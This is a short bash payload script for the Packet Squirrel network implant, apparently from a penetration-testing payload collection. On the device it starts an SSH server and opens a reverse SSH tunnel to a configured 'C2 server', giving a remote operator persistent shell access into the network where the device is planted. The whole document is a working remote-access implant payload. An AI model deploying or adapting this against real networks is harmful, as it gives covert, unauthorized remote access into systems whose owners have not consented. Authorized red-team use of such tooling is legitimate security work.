#!/bin/bash
# Title: SSH Remote Management Tool for Packet Squirrel
# Description: Makes packet Squirrel directly accessible via SSH on a remote server
# Author: BlackPropaganda
# Version: 0.1
# Category: Remote-Access
# Net Mode: NAT
# Firmware: 1.2
#
# LED State Descriptions
# Magenta Solid - SSH connecting
# Blue - SSH connection successful
#

# C2 Server address, port and tunnel port
c2_server="192.168.1.145"
c2_tunnel_port=2222
tunnel_user="username"
# no pass needed, headless mode required so RSA key file is used.
# generate in this directory with: 'ssh -t rsa -b 2048 -f id_rsa'

# waiting for button press to start SSH connection.
#BUTTON
#

# Magenta indicates SSH connection is launching and the server should have received the connection.
LED SETUP

echo -e "SETUP Phase\n" >> /root/payloads/switch3/debug.txt

# we need an IP, so it'll have to be NAT, unless implanted inline.
NETMODE NAT
sleep 8

# debug
#echo -e "NAT configured.\n" $(ifconfig) >> /root/payloads/switch3/debug.txt

# fix file permission problems
# chmod 600 id_rsa

# -R indicates remote port forwarding which tunnels connections to localhost on server to client.
# Once complete, connect to remote SSH server and connect to the squirrel by connecting to localhost at
# the tunnel port specified on the server to reach the Squirrel.
#
# default port is 22
echo -e "Connecting to Server.\n" >> /root/payloads/switch3/debug.txt

echo -e "starting server.\n" >> /root/payloads/switch3/debug.txt
service sshd start
sleep 3

ssh -R $c2_tunnel_port:127.0.0.1:22 -i /root/payloads/switch3/id_rsa $tunnel_user@$c2_server
# echo $ssh_out >> /root/payloads/switch3/debug.txt
# ssh_pid=$!

echo -e "Server Connected.\n" >> /root/payloads/switch3/debug.txt

LED ATTACK
# WARNING: Initial SSH connection must be manual, since c2_server may not be included in trusted_hosts file
# SSH will prompt for verification, and to add host to trusted hosts file.

#BUTTON 365d && {
#   kill $ssh_pid
#}
